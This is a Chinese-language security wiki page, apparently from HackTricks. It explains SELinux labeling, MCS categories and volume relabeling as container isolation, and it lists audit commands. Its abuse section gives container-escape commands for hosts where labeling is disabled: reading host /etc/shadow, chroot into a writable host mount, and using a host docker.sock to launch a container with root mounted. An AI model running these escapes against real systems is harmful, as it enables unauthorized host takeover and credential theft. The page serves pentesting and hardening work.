# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

SELinux 是一种**基于标签的强制访问控制**系统。每个相关进程和对象都可以携带安全上下文，策略决定哪些域可以与哪些类型交互，以及可以采取何种方式交互。在容器化环境中，这通常意味着 runtime 会在受限的容器域下启动容器进程，并使用相应的类型为容器内容打标签。如果策略正常工作，即使某些内容通过挂载变得可见，该进程也可能能够读写其标签预期允许访问的内容，同时被拒绝访问其他 host 内容。

这是主流 Linux 容器部署中可用的最强大 host 侧保护机制之一。在 Fedora、RHEL、CentOS Stream、OpenShift 以及其他以 SELinux 为核心的生态系统中，它尤其重要。在这些环境中，忽略 SELinux 的审查人员通常会误判：为什么一个看起来显而易见的 host compromise 路径实际上会被阻断。

## AppArmor Vs SELinux

高层次上最容易理解的区别是：AppArmor 基于路径，而 SELinux **基于标签**。这会对容器安全产生重大影响。如果同一 host 内容通过意外的挂载路径变得可见，基于路径的策略可能会表现不同。而基于标签的策略会检查对象的标签，以及进程域可以对其执行的操作。这并不意味着 SELinux 简单，但它确实能够抵御一类基于路径技巧的假设；在基于 AppArmor 的系统中，防御人员有时会无意中做出这类假设。

由于该模型以标签为核心，容器 volume 处理和重新标记决策对安全至关重要。如果 runtime 或 operator 为了“让挂载正常工作”而过于广泛地修改标签，那么原本用于隔离 workload 的策略边界可能会比预期弱得多。

## 实验

要查看 host 上 SELinux 是否处于活动状态：
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
检查主机上现有的标签：
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
要将正常运行与禁用标记的运行进行比较：
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
在启用 SELinux 的主机上，这是一个非常实用的演示，因为它展示了在预期的 container domain 下运行的 workload，与被移除了该 enforcement layer 的 workload 之间的差异。

## 运行时使用

在 SELinux 属于平台默认组件的系统上，Podman 与 SELinux 的配合尤其紧密。Rootless Podman 加上 SELinux 是主流 container baseline 中最强的一种，因为该进程在主机侧本身就是 unprivileged 的，同时仍受到 MAC policy 的限制。Docker 在受支持的环境中也可以使用 SELinux，不过管理员有时会为了规避 volume-labeling 带来的问题而将其禁用。CRI-O 和 OpenShift 高度依赖 SELinux，将其作为 container isolation 体系的一部分。Kubernetes 也可以提供与 SELinux 相关的设置，但这些设置的价值显然取决于节点 OS 是否实际支持并强制执行 SELinux。<sup>[[2]](#references)</sup>

反复得到的经验是，SELinux 并不是可有可无的装饰。在围绕它构建的生态系统中，它属于预期 security boundary 的一部分。有关 host-side policy enumeration、transition analysis 以及滥用 SELinux administration tools 的内容，请参阅 [general SELinux page](../../../interesting-files-permissions/selinux.md)。

## MCS 类别与 Volume Relabeling

Container isolation 通常结合了 **type enforcement** 和 **Multi-Category Security (MCS)**。两个进程都可能以 `container_t` 运行，但分别获得 `s0:c123,c456` 和 `s0:c321,c654` 这样的不同 level。Private container content 会以带有匹配 categories 的 `container_file_t` 进行标记，因此仅仅到达另一个 container 的 path 并不足以访问其中的内容。Runtimes 通常会分配 category pair；手动重复使用某个 level 会有意削弱这种 per-container separation。<sup>[[3]](#references)</sup>

请比较 process 和 mount labels，而不要只检查 type：<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Bind-mount 后缀会更改主机 inode 标签，因此会改变安全边界，而不仅仅是挂载元数据：<sup>[[3]](#references)</sup>

- `:Z` 会应用带有容器 MCS 类别的私有标签。它适用于由单个容器或 Pod 所拥有的卷。
- `:z` 会应用共享标签，使其他受限容器也能使用其中的内容（仍受 DAC 权限限制）。将其用于 secrets 或租户专属数据，会移除原本用于隔离容器的 MCS 隔离。
- 重新标记是递归进行的。对 `/`、`/etc`、`/usr` 等范围较大的主机目录树，或整个 home 目录树应用任一选项，既可能向选定容器暴露内容，也可能替换主机服务所依赖的预期标签，导致这些服务停止运行。

在命令行和 manifests 中很容易发现手动复用 level 的情况。以下两个容器会被有意分配相同的 MCS level，因此可以使用标记为该 level 的内容：<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
此外，还要区分 `label=nested` 与 `label=disable`：前者会在容器内部暴露 SELinux 操作，并且仅在策略允许的范围内允许更改标签；后者则会移除该 workload 的标签隔离。两者都应进行审查，但并不等价。<sup>[[3]](#references)</sup>

## 配置错误

经典错误是使用 `label=disable`。在实际操作中，这通常是因为卷挂载被拒绝，而最便捷的短期解决方案是移除 SELinux 的影响，而不是修复标签模型。<sup>[[1]](#references)</sup> 另一个常见错误是错误地重新标记 host 内容。广泛的重新标记操作可能会使应用正常运行，但也可能将容器可访问的范围扩大到远超原本预期的程度。

同样重要的是，不要将**已安装**的 SELinux 与**生效的** SELinux 混为一谈。host 可能支持 SELinux，但仍处于 permissive 模式；或者 runtime 可能没有在预期的 domain 下启动 workload。在这些情况下，保护效果会比文档所暗示的弱得多。

## 滥用

当 SELinux 缺失、处于 permissive 状态，或对 workload 被广泛禁用时，host 挂载的路径会更容易被滥用。原本会受到标签约束的同一个 bind mount，可能变成访问 host 数据或修改 host 的直接途径。当这种情况与可写 volume mount、container runtime 目录，或为方便而暴露敏感 host 路径的运维捷径结合时，尤其需要注意。

SELinux 经常可以解释：为什么某个通用的 breakout writeup 在一台 host 上能够立即生效，但在另一台 host 上却反复失败，即使两者的 runtime flags 看起来相似。缺失的因素通常根本不是 namespace 或 capability，而是仍然保持完整的标签边界。

最快的实际检查方法是比较 active context，然后探测通常会受到标签限制的挂载 host 路径或 runtime 目录：
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
如果存在主机 bind mount，且 SELinux labeling 已被禁用或弱化，通常首先发生的是信息泄露：
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
如果该 mount 具有写权限，并且从 kernel 的角度来看，container 实际上拥有 host-root 权限，下一步应测试受控的主机修改，而不是凭猜测行事：
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
在支持 SELinux 的主机上，运行时状态目录周围的标签丢失也可能暴露直接的权限提升路径：
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
这些命令不能替代完整的 escape chain，但它们可以非常快速地明确：究竟是不是 SELinux 阻止了对 host 数据的访问或对 host 端文件的修改。

### 完整示例：SELinux 已禁用 + 可写的 host 挂载

如果 SELinux labeling 已禁用，并且 host filesystem 以可写方式挂载到 `/host`，那么完整的 host escape 就会变成普通的 bind-mount abuse：
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
如果 `chroot` 成功，容器进程现在将从主机文件系统中运行：
```bash
id
hostname
cat /etc/passwd | tail
```
### 完整示例：SELinux 已禁用 + 运行时目录

如果禁用 labels 后 workload 可以访问 runtime socket，则可以将 escape 委托给 runtime：
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
相关观察是，SELinux 往往正是阻止这类 host-path 或 runtime-state 访问的控制机制。

## 检查

SELinux 检查的目标是确认 SELinux 已启用，识别当前的安全上下文，并确定你关注的文件或路径是否确实受到标签限制。
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
这里值得关注的内容：

- `getenforce` 理想情况下应返回 `Enforcing`；`Permissive` 或 `Disabled` 会改变整个 SELinux 部分的含义。
- 如果当前进程上下文看起来异常或范围过宽，则该 workload 可能没有在预期的容器策略下运行。
- 如果主机挂载的文件或运行时目录带有进程可以过度访问的标签，则 bind mounts 会变得更加危险。

在支持 SELinux 的平台上审查容器时，不要将标记视为次要细节。在许多情况下，标记正是主机尚未被 compromise 的主要原因之一。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 取决于主机 | 在启用 SELinux 的主机上可使用 SELinux separation，但具体行为取决于主机和 daemon 配置 | `--security-opt label=disable`、对 bind mounts 进行宽泛 relabeling、`--privileged` |
| Podman | 在启用 SELinux 的主机上通常启用 | 在 SELinux 系统上，除非被禁用，否则 SELinux separation 是 Podman 的正常组成部分 | `--security-opt label=disable`、`containers.conf` 中的 `label=false`、`--privileged` |
| Kubernetes | 在启用 SELinux 的节点上由 Runtime 分配；也可显式配置 | 当 Pod 未设置标签时，Runtime 可以分配唯一标签。显式的 `securityContext.seLinuxOptions` 控制 Pod/volume 标签；在 Kubernetes 1.37 中，符合条件的 volume 默认使用 SELinux mount labeling | 重复的 MCS levels、permissive/disabled 节点、过于宽泛的 privileged workloads、不加区分地使用 `seLinuxChangePolicy: Recursive` <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / OpenShift style deployments | 通常高度依赖 | 在这些环境中，SELinux 通常是节点 isolation model 的核心组成部分 | 过度扩大访问范围的 custom policies、为兼容性禁用 labeling |

SELinux 的默认设置比 seccomp 的默认设置更依赖发行版。在 Fedora/RHEL/OpenShift-style 系统上，SELinux 通常是 isolation model 的核心。在非 SELinux 系统上，它则完全不存在。

## Kubernetes 1.37 Volume Labeling

Kubernetes 1.37 将 `SELinuxMount` 设为 stable，并默认启用。对于符合条件的 PVC、具有 `seLinuxOptions` 的 Pod，以及声明 `.spec.seLinuxMount: true` 的 CSI driver，kubelet 会使用 `-o context=<label>`，而不是要求 Runtime 对每个 inode 执行递归 relabeling。不支持的 driver 和 volume types 仍会使用递归路径。这样既避免了大规模 relabel 遍历，也避免仅为将 volume 暴露给 Pod 而修改每个文件的持久化标签。<sup>[[2]](#references)[[4]](#references)</sup>

一个 mount 只能携带一个这样的 context。因此，在默认的 `MountOption` 行为下，使用同一节点上同一符合条件的 volume、但具有**不同 SELinux labels**的 Pod 将无法再共存：其中一个 Pod 会因 `conflicting SELinux labels of volume` 错误停留在 `ContainerCreating` 状态。应将其同时视为可用性问题，以及 workload 隐式跨 MCS boundaries 共享 storage 的有用迹象。如果这种共享是有意的——例如，一个 privileged `spc_t` Pod 与一个 confined Pod 使用同一 volume——则针对单个 Pod 的兼容性 escape hatch 是 `seLinuxChangePolicy: Recursive`；在不了解 Runtime 将对哪些路径执行 relabel 的情况下，不要在整个 cluster 范围内应用它。<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
有用的集群侧检查：<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
可选的 kube-controller-manager `selinux-warning-controller` 会检测共享卷且标签不兼容的 Pods，并公开 `selinux_warning_controller_selinux_volume_conflict` metric。在升级前或更改卷标签行为前启用并检查它；它有助于区分真正的 policy 冲突与普通的 CSI 或文件系统故障。<sup>[[2]](#references)</sup>

## References

- [1] [Podman 文档：--security-opt=option（label=disable）](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes：为 Pod 或容器配置 Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Podman run 文档：SELinux labels 和卷重新标记](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Kubernetes v1.37 release：SELinuxMount 和 SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
